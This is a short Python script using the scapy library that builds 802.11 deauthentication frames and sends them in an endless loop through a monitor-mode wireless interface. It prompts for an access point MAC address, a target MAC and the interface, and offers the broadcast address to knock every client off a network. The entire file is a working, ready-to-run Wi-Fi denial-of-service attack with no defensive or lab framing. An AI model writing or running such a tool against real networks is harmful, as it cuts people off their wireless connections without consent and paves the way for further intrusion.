from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth_attack(target_mac, ap_mac, interface):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    
    print(f"Sending Deauth to {target_mac} from {ap_mac} via {interface}")
    
    while True:
        sendp(packet, iface=interface, count=100, inter=0.1, verbose=True)

if __name__ == "__main__":
    interface = input("Enter monitor mode interface (e.g., wlan0mon): ")
    ap_mac = input("Enter AP MAC address: ")
    target_mac = input("Enter target MAC (or FF:FF:FF:FF:FF:FF for all): ")

    deauth_attack(target_mac, ap_mac, interface)
